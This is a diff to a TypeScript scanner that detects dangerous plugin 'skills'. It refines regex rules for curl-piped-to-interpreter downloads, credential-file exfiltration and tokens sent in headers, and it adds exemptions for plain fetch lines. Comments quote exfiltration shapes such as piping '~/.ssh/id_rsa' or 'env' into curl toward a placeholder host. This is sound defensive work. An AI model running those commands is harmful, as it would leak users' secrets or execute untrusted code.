@@ -267,6 +267,114 @@ const PROSE_TARGET = String.raw`(\b(https?|ftp):\/\/|${SHELL_VALUE}|${BARE_HOST}
 /** What precedes a secret that AUTHENTICATES a request rather than being its payload. */
 const AUTH_HEADER = String.raw`(authorization:\s*(bearer|basic|token)?\s*|--oauth2-bearer\s+|private-token:\s*|x-api-key:\s*|(-u|--user)\s+["']?[^\s:"']*:)`;
 
+/**
+ * A request header, given by `-H` / `--header`, whose NAME says it authenticates: the word `token`, `key`,
+ * `auth` or `secret` between hyphens or underscores or at an end of a name of at most 64 characters
+ * (`X-Vault-Token`, `X-aws-ec2-metadata-token`, `x-secret-key`; not `X-Author`, not `X-Monkey`). Its own form,
+ * bound to the flag: the text of a header inside `-d` is a body, not a header. The name itself is `{1,64}`, never
+ * `+`: `de-env-over-network` reads this form inside a lookbehind, which V8 matches right to left, and an unbounded
+ * name there made a line of `x-x-x-…curl-x: $A_TOKEN` cost the square of its length (review of 2026-11-21: 32 KB took
+ * 1.3 s). The lookahead reads the name only (a name holds no `:`).
+ */
+const AUTH_HEADER_FLAG = String.raw`(?:-H|--header)(?:\s+|=)["']?(?=[\w-]{0,63}?(?<![a-z0-9])(?:token|key|auth|secret)(?![a-z0-9]))[\w-]{1,64}:\s*(?:(?:bearer|basic|token)\s+)?`;
+
+/** What precedes a secret that authenticates a request: the exact forms of `AUTH_HEADER`, or an authenticating header. */
+const AUTHENTICATES = `(?:${AUTH_HEADER}|${AUTH_HEADER_FLAG})`;
+
+/**
+ * The one pipeline stage `python -m json.tool`: it reads what it is handed as data and prints it. Exactly that: no
+ * `sudo` before it, no flag between the name and `-m`, no argument or redirection after `json.tool` (up to 16
+ * spaces, then the end of the line or another `|` that is not `|&`).
+ */
+const JSON_TOOL_STAGE = String.raw`python3?[ \t]+-m[ \t]+json\.tool[ \t]{0,16}`;
+
+/**
+ * A stage `| python -m json.tool` that is followed by another `|`: one the search skips. Up to three in a row are
+ * skipped; the fourth is read as an interpreter (and so is any stage that is not one of the three).
+ */
+const READING_STAGE = String.raw`\|[ \t]*${JSON_TOOL_STAGE}(?=\|(?!&))`;
+
+/** At the interpreter's place: not a `json.tool` stage that ends the line (it reads and runs nothing). */
+const NOT_A_READING_STAGE = String.raw`(?!${JSON_TOOL_STAGE}(?=\r?$))`;
+
+const RUNS_A_PROGRAM = String.raw`(sudo\s+(-\S+\s+)*)?${INTERPRETER}\b`;
+
+/**
+ * A `|` and the program run on what it carries, after the stages that only read are skipped. Two ways, told apart
+ * by how many stages come first, so there is one way to read a line and the search never backtracks into fewer
+ * stages (which would hand a `json.tool` to `INTERPRETER`): three stages, and what follows them is the fourth
+ * stage, an interpreter whatever it is; or fewer than three (counted by a lookahead and a back-reference to it, an
+ * atomic group), and the stage after them an interpreter unless it is a `json.tool` that ends the line.
+ * Named group `skippedReads`: a pattern holds it once.
+ */
+const PIPE_TO_INTERPRETER = String.raw`(?:(?:${READING_STAGE}){3}\|\s*${RUNS_A_PROGRAM}|(?=(?<skippedReads>(?:${READING_STAGE}){0,2}(?!${READING_STAGE})))\k<skippedReads>\|\s*${NOT_A_READING_STAGE}${RUNS_A_PROGRAM})`;
+
+/**
+ * A plain request line (`exemptLine` of the credential-file rules): the whole line is ONE `curl` or `wget` fetching
+ * ONE `http(s)` URL, with flags from a closed list that send and write nothing, and at most three text filters
+ * after it that are given no file. A credential-file name in the PATH of that URL is a remote path, not a local
+ * file. A closed grammar of what is exempt, never a list of what ends it: whatever does not match whole is read as
+ * before. No `i` flag (`-T`, `-K`, `-F` are not `-t`, `-k`, `-f`); read only for a line of up to
+ * `PLAIN_FETCH_MAX` characters. Every token is told from the next by its first character or by the white space
+ * between them, so there is one way to match a line and a failure costs a step per token.
+ */
+const PLAIN_URL_CHARS = String.raw`[\w.~%/:?#=+-]`;
+/** A host written out that is local (`LOCAL_HOST`, with its words in both cases: this pattern has no `i`). */
+const PLAIN_LOCAL_HOST = String.raw`(?:[Ll][Oo][Cc][Aa][Ll][Hh][Oo][Ss][Tt]|127(?:\.\d{1,3}){3}|0\.0\.0\.0|::1|10(?:\.\d{1,3}){3}|192\.168(?:\.\d{1,3}){2}|172\.(?:1[6-9]|2\d|3[01])(?:\.\d{1,3}){2}|[\w-]+(?:\.[\w-]+)*\.(?:[Ll][Oo][Cc][Aa][Ll](?:[Hh][Oo][Ss][Tt])?|[Ii][Nn][Tt][Ee][Rr][Nn][Aa][Ll]|[Ll][Aa][Nn]|[Hh][Oo][Mm][Ee]\.[Aa][Rr][Pp][Aa]))`;
+/** Between `://` and the path: not a local host. */
+const PLAIN_NOT_LOCAL = String.raw`(?!${PLAIN_LOCAL_HOST}(?![\w.-]))`;
+/** A URL in double quotes (`$NAME` and `${NAME}` allowed) or bare (no `$`); never a `..` in it. */
+const PLAIN_URL = String.raw`(?:"https?://${PLAIN_NOT_LOCAL}(?![^"]*\.\.)(?:${PLAIN_URL_CHARS}|\$\w+(?!\w)|\$\{\w+\})*"|https?://${PLAIN_NOT_LOCAL}(?![^\s|]*\.\.)${PLAIN_URL_CHARS}+)`;
+const PLAIN_CURL_FLAG = String.raw`(?:-[sSLkfiIvg46]+|-o[ \t]+/dev/null|--(?:silent|location|insecure|fail|head)|(?:-m|--max-time|--connect-timeout)[ \t]+\d+)`;
+const PLAIN_WGET_FLAG = String.raw`-[qSv46]+`;
+const PLAIN_WGET_STDOUT = String.raw`-O[ \t]+-`;
+/** An operand of a filter: a word that never starts with `-` and holds nothing the shell would expand to a file. */
+const PLAIN_OPERAND = String.raw`(?:"(?!-)[\w ,.:=^*+?\[\]-]*"|[\w.,:=^+][\w.,:=^+-]*)`;
+const PLAIN_FILTER = String.raw`(?:e?grep(?:[ \t]+-[ivcnowEFq]+)?[ \t]+${PLAIN_OPERAND}|jq(?:[ \t]+-[rc]+)?[ \t]+${PLAIN_OPERAND}|(?:head|tail)(?:[ \t]+(?:-n[ \t]+\d+|-\d+))?|wc(?:[ \t]+-[lcw]+)?|sort(?:[ \t]+-[unr]+)?|uniq(?:[ \t]+-[cd]+)?|cut[ \t]+-d[\w:,=.-][ \t]+-f[\d,-]+)`;
+const PLAIN_CURL = String.raw`curl(?:[ \t]+${PLAIN_CURL_FLAG})*[ \t]+${PLAIN_URL}(?:[ \t]+${PLAIN_CURL_FLAG})*`;
+const PLAIN_WGET = String.raw`wget(?:[ \t]+${PLAIN_WGET_FLAG})*(?:[ \t]+${PLAIN_WGET_STDOUT}(?:[ \t]+${PLAIN_WGET_FLAG})*[ \t]+${PLAIN_URL}(?:[ \t]+${PLAIN_WGET_FLAG})*|[ \t]+${PLAIN_URL}(?:[ \t]+${PLAIN_WGET_FLAG})*[ \t]+${PLAIN_WGET_STDOUT}(?:[ \t]+${PLAIN_WGET_FLAG})*)`;
+export const PLAIN_FETCH_LINE = new RegExp(
+  String.raw`^[ \t]*(?:${PLAIN_CURL}|${PLAIN_WGET})(?:[ \t]*\|(?!&)[ \t]*${PLAIN_FILTER}){0,3}[ \t]*$`,
+);
+/** A line longer than this is never read as a plain request line (a finding more, never one fewer). */
+const PLAIN_FETCH_MAX = 512;
+
+/**
+ * A sentence that names a credential file only inside the one URL it fetches: one `http(s)` URL written out whole
+ * (no `$`) whose host is not a local one, no word that is a flag with a `T`, `d`, `F` or `K` in it (`-sT`, `-d`,
+ * `--header`) nor `--upload` / `--post` / `--data` / `--form` / `--json` / `--url-query` / `--variable` / `--config`
+ * (each can send `@-` or `@file`, or read a config that does), no word that starts with `@` (`-H @-` sends the headers
+ * it reads), and the name nowhere outside the URL. The local host, the flags and the `@` word: review of 2026-11-21
+ * ("Fetch http://127.0.0.1:8080/.env …", "… curl --json @- https://c.example/.ssh/id_rsa", "… curl -H @- …",
+ * "… curl --config - …" were no longer reported).
+ */
+const SENTENCE_URL = /\bhttps?:\/\/[\w.~%/:?#=+-]+/gi;
+const SENDING_FLAG = /(?:^|\s)(?:-\S*[TdFK]|--(?:upload|post|data|form|json|url-query|variable|config)|@)/;
+/** The sentence's URL with its host not a local one (`PLAIN_LOCAL_HOST` spells its words in both cases). */
+const SENTENCE_URL_NOT_LOCAL = new RegExp(String.raw`^[Hh][Tt][Tt][Pp][Ss]?://${PLAIN_NOT_LOCAL}`);
+const SENSITIVE_FILE_RE = new RegExp(SENSITIVE_FILE, 'i');
+function isUrlOnlySentence(text: string): boolean {
+  const urls = text.match(SENTENCE_URL);
+  if (urls === null || urls.length !== 1) return false;
+  if ((text.match(/https?:\/\//gi) ?? []).length !== 1) return false;
+  if (!SENTENCE_URL_NOT_LOCAL.test(urls[0])) return false;
+  const at = text.indexOf(urls[0]);
+  const after = text.charAt(at + urls[0].length);
+  if (after === '$' || after === '{') return false;
+  if (SENDING_FLAG.test(text)) return false;
+  return !SENSITIVE_FILE_RE.test(text.slice(0, at) + ' ' + text.slice(at + urls[0].length));
+}
+
+/** `exemptLine` of the credential-file rules that read code: a plain request line. */
+function isPlainFetchLine(text: string): boolean {
+  return PLAIN_FETCH_LINE.test(text);
+}
+
+/** `exemptLine` of the prose rule: a plain request line, or a sentence whose one URL holds the name. */
+function isPlainFetchOrUrlSentence(text: string): boolean {
+  return PLAIN_FETCH_LINE.test(text) || isUrlOnlySentence(text);
+}
+
 interface SkillRule {
   id: string;
   category: ThreatCategory;
@@ -307,6 +415,12 @@ interface SkillRule {
    * with nothing for them to find.
    */
   requires?: RegExp;
+  /**
+   * A unit this says is exempt is skipped for every pattern of the rule: a plain request line whose credential-file
+   * name is in the path of its URL (`PLAIN_FETCH_LINE`). Tried beside `requires`, only for a unit of up to
+   * `PLAIN_FETCH_MAX` characters that is not inline code (a span in the middle of a sentence keeps its finding).
+   */
+  exemptLine?: (text: string) => boolean;
 }
 
 /**
@@ -537,7 +651,7 @@ export const SKILL_RULES: SkillRule[] = [
       // rule. Measured: an official plugin's `curl -H "Authorization: Bearer
       // $API_TOKEN" https://api.example.com/mcp/health`, a health check in a
       // reference doc, read critical and took its skill to DO_NOT_INSTALL.
-      new RegExp(`\\b(curl|wget)\\b[^\\n]{0,200}(?<!${AUTH_HEADER}["']?)(\\$\\{?[A-Z_]*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL))`, 'i'),
+      new RegExp(`\\b(curl|wget)\\b[^\\n]{0,200}(?<!${AUTHENTICATES}["']?)(\\$\\{?[A-Z_]*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL))`, 'i'),
       // The whole environment (wave 2 of the 3.0 review: `env | curl -X POST
       // --data-binary @- https://…` read SAFE): piped into a sender, or
       // substituted into its arguments — `curl -d "$(env)"`, `@<(printenv)`.
@@ -576,7 +690,7 @@ export const SKILL_RULES: SkillRule[] = [
     target: 'code',
     patterns: [
       new RegExp(
-        `\\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\\b[^\\n]{0,200}${AUTH_HEADER}["']?\\$\\{?[A-Z_]*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)`,
+        `\\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\\b[^\\n]{0,200}${AUTHENTICATES}["']?\\$\\{?[A-Z_]*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)`,
         'i',
       ),
     ],
@@ -590,6 +704,7 @@ export const SKILL_RULES: SkillRule[] = [
       'Code references SSH keys, cloud credentials, browser data or .env — sensitive material a skill rarely needs.',
     target: 'code',
     patterns: [new RegExp(SENSITIVE_FILE_STRONG, 'i'), new RegExp(ENV_READ, 'i')],
+    exemptLine: isPlainFetchLine,
   },
   {
     id: 'de-sensitive-file-over-network',
@@ -603,6 +718,7 @@ export const SKILL_RULES: SkillRule[] = [
       'and a network client — the shape of `cat ~/.ssh/id_rsa | curl --data-binary @- https://…`.',
     target: 'code',
     patterns: [new RegExp(`^(?=.*${SENSITIVE_FILE})(?=.*${NETWORK_SENDER})`, 'i')],
+    exemptLine: isPlainFetchLine,
   },
   {
     id: 'de-sensitive-file-over-network-prose',
@@ -618,6 +734,7 @@ export const SKILL_RULES: SkillRule[] = [
     patterns: [
       new RegExp(`^(?=.*${SENSITIVE_FILE})(?=.*(${NETWORK_SENDER}|${SEND_VERB}))(?=.*${REMOTE_DESTINATION})`, 'i'),
     ],
+    exemptLine: isPlainFetchOrUrlSentence,
   },
   {
     id: 'de-dns-or-raw-egress',
@@ -676,7 +793,7 @@ export const SKILL_RULES: SkillRule[] = [
     message: 'Downloads a remote script and executes it unverified (curl|bash and friends).',
     target: 'code',
     patterns: [
-      new RegExp(String.raw`\b(curl|wget)\b[^\n|]{0,200}\|\s*(sudo\s+(-\S+\s+)*)?${INTERPRETER}\b`, 'i'),
+      new RegExp(String.raw`\b(curl|wget)\b[^\n|]{0,200}${PIPE_TO_INTERPRETER}`, 'i'),
       /\beval\s+"\$\(\s*(curl|wget)\b/i,
       /\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|]{0,200}\|\s*(iex|invoke-expression)/i,
       // `bash <(curl …)`, `sh -c "$(curl …)"`, and the same with any
@@ -703,7 +820,7 @@ export const SKILL_RULES: SkillRule[] = [
       // get.docker.com shape), or a variable (`URL=https://…`, then
       // `curl -s $URL | bash`) as the target.
       new RegExp(
-        String.raw`\b(curl|wget)\b[^|\n]{0,200}?${PROSE_TARGET}[^|\n]{0,300}\|\s*(sudo\s+(-\S+\s+)*)?${INTERPRETER}\b`,
+        String.raw`\b(curl|wget)\b[^|\n]{0,200}?${PROSE_TARGET}[^|\n]{0,300}${PIPE_TO_INTERPRETER}`,
         'i',
       ),
       new RegExp(String.raw`\b(${INTERPRETER}|source)\s+(-\w+\s+)*<\(\s*(curl|wget)\b[^)\n]{0,300}?${PROSE_TARGET}`, 'i'),
@@ -872,7 +989,7 @@ export const SKILL_RULES: SkillRule[] = [
       // skills of 2026-02, whose download hides inside the blob. The pipe is
       // looked for in the 300 characters after the flag, as every run here:
       // unbounded, the line was read again from every `base64 -d` on it.
-      new RegExp(String.raw`\bbase64\s+(-\w+\s+)*(-d|-D|--decode)\b[^\n|]{0,300}\|\s*(sudo\s+(-\S+\s+)*)?${INTERPRETER}\b`, 'i'),
+      new RegExp(String.raw`\bbase64\s+(-\w+\s+)*(-d|-D|--decode)\b[^\n|]{0,300}${PIPE_TO_INTERPRETER}`, 'i'),
       /FromBase64String[^\n]{0,200}\b(iex|Invoke-Expression)\b|\b(iex|Invoke-Expression)\b[^\n]{0,120}FromBase64String/i,
     ],
   },
@@ -1498,6 +1615,7 @@ function matchUnits(rules: SkillRule[], units: Unit[]): RuleMatch[] {
       let best: RuleMatch | null = null;
       for (const unit of units) {
         if (rule.requires !== undefined && !rule.requires.test(unit.text)) continue;
+        if (rule.exemptLine !== undefined && unit.source !== 'inline' && unit.text.length <= PLAIN_FETCH_MAX && rule.exemptLine(unit.text)) continue;
         pattern.lastIndex = 0;
         let line = unit.line;
         let snippet: string | null = null;
